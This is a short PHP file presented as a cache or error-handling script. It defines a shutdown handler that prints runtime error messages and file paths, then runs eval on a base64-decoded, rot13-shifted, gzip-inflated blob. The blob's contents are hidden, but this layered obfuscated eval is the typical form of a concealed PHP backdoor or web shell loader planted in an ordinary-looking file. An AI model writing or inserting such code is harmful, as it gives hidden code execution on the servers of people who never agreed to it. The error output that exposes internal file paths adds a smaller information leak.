<?php

error_reporting(E_ALL); //E_ALL

function cache_shutdown_error() {

    $_error = error_get_last();

    if ($_error && in_array($_error["type"], array(1, 4, 16, 64, 256, 4096, E_ALL))) {

        echo "Runtime Error：</br>";
        echo "Error:" . $_error["message"] . "</br>";
        echo "File:" . $_error["file"] . "</br>";
        echo "Line:" . $_error["line"] . "</br>";

    }
}

register_shutdown_function("cache_shutdown_error");

eval(gzinflate(str_rot13(base64_decode('NYxaC4JAGITv/op68bCCdUW36BC1odDHotIl4sXa11wQlWghI/rvekVmm5l0xmQLrcmS4NDVrVEmbwH8uPNYSCPc0cCtegw2pnQAmyQFCHX4qJTBTfWGbd7CsfviCV3bse+VDUdWGJmoBsaGuZDx9MTTM83WdiJlOKz2nF78kSbeyyE/SEtV1IzGbC7CKIjIfDoj20lflZTYQ/v8J2RDhkz//gA='))));

